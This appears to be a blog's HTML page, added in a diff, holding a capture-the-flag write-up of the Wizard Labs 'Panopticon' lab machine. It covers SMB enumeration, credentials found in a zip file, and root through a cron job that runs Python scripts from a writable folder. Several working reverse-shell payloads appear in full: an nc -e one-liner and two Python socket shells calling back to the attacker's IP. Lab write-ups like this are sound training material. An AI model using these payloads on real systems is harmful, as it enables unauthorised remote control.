@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Wizard Labs &#8211; Panopticon</title>
+	<meta name="description" content="   https://labs.wizard-security.net ">
+	
+	<link rel="canonical" href="http://0.0.0.0:4000/2019/04/16/wizard-labs-panopticon/">
+	<link rel="alternate" type="application/rss+xml" title="Your awesome title" href="http://0.0.0.0:4000/feed.xml" />
+	
+	<!-- <link rel="stylesheet" href="/css/main.css"> -->
+    
+    <link rel="stylesheet" type="text/css" href="/static/css/bootstrap.min.css">
+    <link rel="stylesheet" type="text/css" href="/static/css/index.css">
+	<script type="text/javascript" src="/static/js/jquery-1.11.1.min.js"></script>
+	<script type="text/javascript" src="/static/js/bootstrap.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="/static/css/monokai_sublime.min.css">
+	<script type="text/javascript" src="/static/js/highlight.min.js"></script>
+
+    <!--
+    <link rel="stylesheet" type="text/css" href="http://apps.bdimg.com/libs/bootstrap/3.3.0/css/bootstrap.min.css">
+	<script type="text/javascript" src="http://apps.bdimg.com/libs/jquery/2.1.1/jquery.min.js"></script>
+	<script type="text/javascript" src="http://apps.bdimg.com/libs/bootstrap/3.3.0/js/bootstrap.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="http://apps.bdimg.com/libs/highlight.js/8.4/styles/monokai_sublime.min.css">
+	<script type="text/javascript" src="http://apps.bdimg.com/libs/highlight.js/8.4/highlight.min.js"></script>
+    -->
+    
+	<script type="text/javascript" src="/static/js/index.js"></script>
+	<script>hljs.initHighlightingOnLoad();</script>
+</head>
+
+ <!--  <body data-spy="scroll" data-target="#myAffix"> -->
+  <body>
+
+    <header>
+
+<!-- navbar -->
+  <nav class="navbar navbar-inverse">
+  <div class="container">
+    <!-- Brand and toggle get grouped for better mobile display -->
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="/">Your awesome title</a>
+      <p class="navbar-text"></p>
+    </div>
+    <!-- Collect the nav links, forms, and other content for toggling -->
+    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+      <ul class="nav navbar-nav navbar-right">
+
+        
+          <li>
+        
+        <a href="/">Home</a></li>
+
+        
+          
+        
+          
+            
+              <li>
+            
+            <a href="/about/"><span class="glyphicon "></span> About</a></li>
+          
+        
+          
+            
+              <li>
+            
+            <a href="/about/"><span class="glyphicon "></span> About</a></li>
+          
+        
+          
+        
+          
+        
+          
+        
+      </ul>
+    </div><!-- /.navbar-collapse -->
+  </div><!-- /.container-fluid -->
+</nav>
+
+</header>
+
+    <div id="main" class="container main">
+      <div class="row">
+  <div id="myArticle" class="col-sm-9">
+    <div class="post-area post">
+      <header>
+        <h1>Wizard Labs &#8211; Panopticon</h1>
+        <p>Apr 16, 2019 • rowbot</p>
+      </header>
+      <hr>
+      <article>
+        <div class="wp-block-image">
+  <figure class="aligncenter"><img src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image.png?w=680" alt="" class="wp-image-637" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image.png?w=192 192w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image.png?resize=167%2C300 167w" sizes="(max-width: 192px) 100vw, 192px" data-recalc-dims="1" /><figcaption> <br /><a href="https://labs.wizard-security.net/">https://labs.wizard-security.net</a> </figcaption></figure>
+</div>
+
+<p>I found getting the user on this box very easy, I think it took me &lt; 10 minutes. Then after about another 10 minutes I roughly knew what I had to do to get root but for the guts of 3 hours couldn’t figure out why I wasn’t getting the cron job to execute my script! I figured it out in the end, I just had to take a step back and re-read the /var/mail/seer log.</p>
+
+<hr class="wp-block-separator" />
+
+<p>Ran the following nmap scan: nmap -sC -sV -oA all -vv -p- 10.1.1.34.</p>
+
+<div class="wp-block-image">
+  <figure class="aligncenter"><img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-2.png?w=680" alt="" class="wp-image-640" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-2.png?w=956 956w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-2.png?resize=300%2C76 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-2.png?resize=768%2C195 768w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /></figure>
+</div>
+
+<p>What stood out to me was port 80, maybe some interesting directories or a web app attack could be carried out. Port 139 and 445 was SAMBA- always interesting to see what I can access through open shares or vulnerable versions.</p>
+
+<p>Port 80 revealed a website. I didn’t poke about the website as it looked quite flat, the only entry point was the contact form – that I could see. I was keen to move on to what I could see from the SAMBA share.</p>
+
+<div class="wp-block-image">
+  <figure class="aligncenter"><img src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-3.png?w=680" alt="" class="wp-image-643" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-3.png?w=899 899w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-3.png?resize=300%2C218 300w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-3.png?resize=768%2C558 768w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /></figure>
+</div>
+
+<p>I ran smbmap to enumerate the SAMBA share and discover the Public share can be read. <a href="https://guide.offsecnewbie.com/network-pen#smbmap">https://guide.offsecnewbie.com/network-pen#smbmap</a></p>
+
+<pre><span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/panopticon </font></span><font color="#3465A4"></font> <font color="#4E9A06">smbmap</font> -H $ip
+[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.1.1.34...
+[+] IP: 10.1.1.34:445	Name: panopticon.wl                                     
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	public                                            	READ ONLY
+	IPC$                                              	NO ACCESS
+</pre>
+
+<p>I discovered a zip file called old-site.zip.</p>
+
+<pre><span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/panopticon </font></span><font color="#3465A4"></font> <font color="#4E9A06">smbmap</font> -R Public -H $ip <font color="#555753"><b>#Recursively list dirs, and files</b></font>
+[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.1.1.34...
+[+] IP: 10.1.1.34:445	Name: panopticon.wl                                     
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	Public                                            	READ ONLY
+	.\
+	dr--r--r--                0 Sun Jun 17 16:17:11 2018	.
+	dr--r--r--                0 Sat Feb 24 19:27:52 2018	..
+	-r--r--r--           427943 Sat Feb 24 19:57:46 2018	old-site.zip
+</pre>
+
+<p>I downloaded it. As you can see smbmap is a nice little tool. I prefer it to enum4linux – though enum4linux does a few different things.</p>
+
+<pre><span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/panopticon </font></span><font color="#3465A4"></font> <font color="#4E9A06">smbmap</font> -R Public -H $ip -A old-site.zip -q <font color="#555753"><b>#downloads a file in quiet mode</b></font>
+[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.1.1.34...
+[+] IP: 10.1.1.34:445	Name: panopticon.wl                                     
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	[+] Match found! Downloading: Public\.\old-site.zip
+	Public                                            	READ ONLY
+	[+] Starting search for files matching 'old-site.zip' on share Public.
+	[+] Match found! Downloading: Public\old-site.zip
+</pre>
+
+<p>I knew that I there would be a config file which I could get a password or user from. So I unzipped the file.<figure class="wp-block-image"></figure></p>
+
+<p><img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-4.png?w=680" alt="" class="wp-image-661" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-4.png?w=598 598w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-4.png?resize=300%2C236 300w" sizes="(max-width: 598px) 100vw, 598px" data-recalc-dims="1" /> &lt;/figure&gt; <figure class="wp-block-image"><img src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-5.png?w=680" alt="" class="wp-image-662" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-5.png?w=574 574w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-5.png?resize=300%2C43 300w" sizes="(max-width: 574px) 100vw, 574px" data-recalc-dims="1" />&lt;figcaption&gt;username and password captured.&lt;/figcaption&gt;</figure></p>
+
+<p>I remembered that there was an ssh port open and tried to login with those creds.</p>
+
+<pre><span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/panopticon </font></span><font color="#3465A4"></font> <font color="#4E9A06">ssh</font> seer@$ip                                                              
+seer@10.1.1.34';s password: 
+Linux Panopticon 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+&lt;mark&gt;You have new mail.&lt;/mark&gt;
+Last login: Sun Dec  2 09:18:32 2018 from 10.253.1.0
+<font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~</b></font>$ cat /home/seer/user.txt 
+6d3934480b23c0ca3d164cf19fa11946
+<font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~</b></font>$ 
+</pre>
+
+<p>I noticed when I logged in that I received a message that I had new mail. I highlighted it above.</p>
+
+<p>I knew that mail for the user is located in /var/mail/seer in this instance.<br />
+What does it contain, and who/what sent it? Most often the messages contain output of cron jobs, or a system security report by logwatch, or similar things. Time to read it!</p>
+
+<div class="wp-block-image">
+  <figure class="aligncenter"><img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-6.png?w=680" alt="" class="wp-image-668" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-6.png?w=676 676w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-6.png?resize=237%2C300 237w" sizes="(max-width: 676px) 100vw, 676px" data-recalc-dims="1" /></figure>
+</div>
+
+<p>The mail file was very big</p>
+
+<pre><font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~</b></font>$ ls -la /var/mail/seer 
+-rw-rw---- 1 seer mail 23172905 Dec  2 11:36 /var/mail/seer
+</pre>
+
+<div class="wp-block-image">
+  <figure class="aligncenter"><img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-7.png?w=680" alt="" class="wp-image-671" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-7.png?w=498 498w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-7.png?resize=300%2C103 300w" sizes="(max-width: 498px) 100vw, 498px" data-recalc-dims="1" /><figcaption>I&#8217;m terrible at reading file sizes and working them out to something I can understand so I turn to Google</figcaption></figure>
+</div>
+
+<p>I scrolled through and seen reference to a hidden bash script called .lol.sh</p>
+
+<pre class="wp-block-preformatted">Subject: Cron &lt;root@Panopticon&gt; bash /var/tmp/.lol.sh
+</pre>
+
+<pre><font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~/dev_departement</b></font>$ ls -la /var/tmp/.lol.sh 
+-rwx------ 1 root root 125 Jun 27 14:38 <font color="#8AE234"><b>/var/tmp/.lol.sh</b></font>
+You have new mail in /var/mail/seer
+</pre>
+
+<p>In Seer’s home directory there was a folder called dev_departement (spelled incorrectly). Maybe the machine’s author is French?</p>
+
+<div class="wp-block-image">
+  <figure class="aligncenter"><img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-8.png?w=680" alt="" class="wp-image-673" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-8.png?w=511 511w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-8.png?resize=300%2C211 300w" sizes="(max-width: 511px) 100vw, 511px" data-recalc-dims="1" /></figure>
+</div>
+<p>The bad spelling and grammar continues when I looked at dev.txt 🙂</p>
+
+<pre><font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~/dev_departement</b></font>$ cat dev.txt 
+Hello Seer !! You are the only script developper in this departement ... Like I said you , please drop here all your scripts maybe they can make my life easier :)
+
+Brenda&amp;
+<font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~/dev_departement</b></font>$ 
+</pre>
+
+<p>So to summarize what I’ve found. There looks to be a cronjob running which runs a hidden file called .lol.sh of which I am not able to read. There is a file telling me that any scripts I drop into the /home/seer/dev_departement folder will be run.</p>
+
+<p>This was where I was stuck for a few hours as I looked through the mail file and found a lot of references to a hidden file called .update.sh</p>
+
+<pre class="wp-block-preformatted">Subject: Cron &lt;root@Panopticon&gt; /home/seer/.update.sh Subject: Cron &lt;root@Panopticon&gt; /home/seer/.update.sh Subject: Cron &lt;root@Panopticon&gt; /home/seer/.update.sh Subject: Cron &lt;root@Panopticon&gt; /home/seer/.update.sh Subject: Cron &lt;root@Panopticon&gt; /home/seer/.update.sh Subject: Cron &lt;root@Panopticon&gt; /home/seer/.update.sh Subject: Cron &lt;root@Panopticon&gt; /home/seer/.update.sh <br /><br />From: root@panopticon.panopticon (Cron Daemon) To: root@panopticon.panopticon Subject: Cron &lt;root@Panopticon&gt; /home/seer/update.sh MIME-Version: 1.0 Content-Type: text/plain; charset=UTF-8 Content-Transfer-Encoding: 8bit X-Cron-Env: &lt;SHELL=/bin/sh&gt; X-Cron-Env: &lt;HOME=/root&gt; X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt; X-Cron-Env: &lt;LOGNAME=root&gt; Message-Id: &lt;E1epgcw-0000CA-BA@Panopticon.Panopticon&gt; Date: Sat, 24 Feb 2018 21:41:02 +0100 </pre>
+
+<p>I thought that 1) the script had to be hidden and called update.sh and 2) that the script had to be a bash file while also being saved in seer’s home directory rather than the dev one.</p>
+
+<p>After creating a .sh file with</p>
+
+<pre class="wp-block-preformatted">nc -e /bin/sh 10.253.0.255 443 </pre>
+
+<p>inside and starting a listener at my end, nothing was coming back. The script was not being run. I went back and forth moving the file to different locations, using different ports, getting the script to wget from my webserver to see if it was running it at all – nothing! Even confirming that the script was executable.</p>
+
+<p>I reviewed the mail file again and seen this beauty – highlighted below</p>
+
+<pre>From: root@panopticon.panopticon (Cron Daemon)
+To: root@panopticon.panopticon
+Subject: Cron &lt;root@Panopticon&gt; &lt;mark&gt; for f in /home/seer/dev_departement/*.py ; do  /usr/bin/python3 "$f" done &lt;/mark&gt;
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1fY9gM-0000EM-02@Panopticon.Panopticon&gt;
+Date: Wed, 27 Jun 2018 14:36:22 +0200
+</pre>
+
+<p>The script had to be a python script.</p>
+
+<p>I tried using the following script but it didnt work, probably because it needed to be python3</p>
+
+<pre class="wp-block-preformatted"><font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~/dev_departement</b></font>$ cat script.py 
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.253.0.255",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+<font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~/dev_departement</b></font>$ 
+</pre>
+
+<p>I created a different python script</p>
+
+<pre class="wp-block-preformatted"><font color="#34E2E2"><b>import</b></font> socket
+<font color="#34E2E2"><b>import</b></font> subprocess
+s=socket.socket()
+s.connect((<font color="#8AE234"><b>"10.253.0.255"</b></font>,443))
+<font color="#34E2E2"><b>while</b></font> True:
+     proc = subprocess.Popen(s.recv(1024),  shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+     s.send(proc.stdout.read() + proc.stderr.read())
+</pre>
+
+<pre class="wp-block-preformatted"><font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~/dev_departement</b></font>$ ls -la
+total 16
+drwxrwxrwx 2 root root 4096 Dec  2 13:14 <span style="background-color:#4E9A06"><font color="#3465A4">.</font></span>
+drwxr-xr-x 7 seer seer 4096 Jun 27 14:17 <font color="#729FCF"><b>..</b></font>
+-rw-r--r-- 1 root root  172 Jun 17 17:34 dev.txt
+-rwxr-xr-x 1 seer seer  273 Dec  2 13:02 <font color="#8AE234"><b>script.py</b></font>
+</pre>
+
+<p>Started a listener on my machine and got a connection back.</p>
+
+<pre class="wp-block-preformatted">⚡  ~/Desktop/panopticon  nc -lnvp 443  
+listening on [any] 443 ...
+connect to [10.253.0.255] from (UNKNOWN) [10.1.1.34] 33634
+id
+uid=0(root) gid=0(root) groups=0(root)
+cat /root/root.txt
+8b470f864495744fcd8c3dc7b370e889
+</pre>
+
+<p>I wanted to see what was in the .lol.sh</p>
+
+<pre class="wp-block-preformatted">cat /var/tmp/.lol.sh
+cd /home/seer/dev_departement 
+for f in *.py; do  # or wget-*.sh instead of *.sh
+  python3 "$f"   || break # if needed 
+done
+</pre>
+
+<p>And there’s the code that ran the python script in.</p>
+
+<p>So this was a nice easy box to start with and I’m looking forward to exploring the other boxes that wizard labs have.</p>
+
+      </article>
+      <hr>
+        <div class="bdsharebuttonbox">
+            <a href="#" class="bds_more" data-cmd="more"></a>
+            <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+            <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+            <a href="#" class="bds_fbook" data-cmd="fbook" title="Share to Facebook"></a>
+            <a href="#" class="bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+        </div>
+        <script>
+            window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    </div>
+	    
+  </div>
+  
+  <div id="content" class="col-sm-3">
+    <!-- <div id="myAffix" class="shadow-bottom-center hidden-xs" data-spy="affix" data-offset-top="0" data-offset-bottom="-20"> -->
+    <div id="myAffix" class="shadow-bottom-center hidden-xs" >
+      <div class="categories-list-header">
+        Content
+      </div>
+      <div class="content-text"></div>
+    </div>
+  </div>
+  
+</div>
+    </div>
+
+    
+    <div id="top" data-toggle="tooltip" data-placement="left" title="back to top">
+      <a href="javascript:;">
+        <div class="arrow"></div>
+        <div class="stick"></div>
+      </a>
+    </div>
+
+    <footer class="">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-12">
+        <a href="mailto:your-email@example.com"><span class="glyphicon glyphicon-envelope"></span> your-email@example.com</a>
+        <span class="point"> · </span>
+        
+          <a href="https://github.com/jekyll">
+            <span class="icon">
+              <svg viewBox="0 0 16 16">
+                <path fill="#aaa" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/>
+              </svg>
+            </span>
+            Github
+            <!-- <span>jekyll</span> -->
+          </a>
+          
+          <span class="point"> · </span>
+          <span><a href="_posts/2019-04-16-wizard-labs-panopticon.md">View source</a></span>
+          <span class="point"> · </span>
+          <span><a class="newpost" href="javascript:;">New post</a></span>
+		  <span class="point"> · </span>
+          <span><a href="/feed.xml">RSS</a></span>
+          <span class="point"> · </span>
+          <span>&copy; 2015 LiXizhi</span>
+      </div>
+    </div>
+  </div>
+</footer>
+
+    <script type="text/javascript">
+    function OnClickNewPost()
+    {
+        var title = prompt("Please enter title of your post");
+        if (title!=null){
+            title = title.replace(" ", "-");
+            var currentdate = new Date();
+            var urlNewPage = "?filename=_posts/" 
+                + currentdate.getFullYear() + "-" + (currentdate.getMonth()+1) + "-" + currentdate.getDate() + "-" + title + ".md";
+                
+            var defaultText =  [
+                '---',
+                'layout: post',
+                'comments: true',
+                'categories: diary',
+                '---',
+                '## Title',
+                'text'
+                ].join('\n');
+            urlNewPage += "&value=" + encodeURIComponent(defaultText);
+            window.open(urlNewPage);
+        }
+    }
+    
+    $(function() {
+      // CreateNewPostLinks
+      $('.newpost').each(function(){
+          $(this).click(OnClickNewPost);
+      });
+    });
+</script>
+  
+  </body>
+</html>
